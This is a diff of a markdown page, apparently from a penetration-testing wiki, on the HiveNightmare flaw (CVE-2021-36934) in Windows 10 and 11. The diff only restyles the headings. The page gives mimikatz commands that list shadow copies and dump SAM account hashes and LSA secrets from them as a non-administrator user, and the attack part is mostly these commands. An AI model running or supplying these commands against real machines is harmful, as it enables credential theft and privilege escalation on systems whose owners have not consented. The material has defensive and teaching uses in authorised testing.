@@ -1,6 +1,6 @@
 # HiveNightmare
 
-#### CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user.
+#### <mark style="color:green;">CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user.</mark>
 
 ## <mark style="color:red;">Exploitation</mark>
 
@@ -22,19 +22,19 @@ Then exploit the CVE by requesting the shadowcopies on the filesystem and readin
 mimikatz> token::whoami /full
 ```
 
-#### List shadow copies available
+### <mark style="color:orange;">List shadow copies available</mark>
 
 ```
 mimikatz> misc::shadowcopies
 ```
 
-#### Extract account from SAM databases
+### <mark style="color:orange;">Extract account from SAM databases</mark>
 
 ```
 mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
 ```
 
-#### Extract secrets from SECURITY
+### <mark style="color:orange;">Extract secrets from SECURITY</mark>
 
 ```
 mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
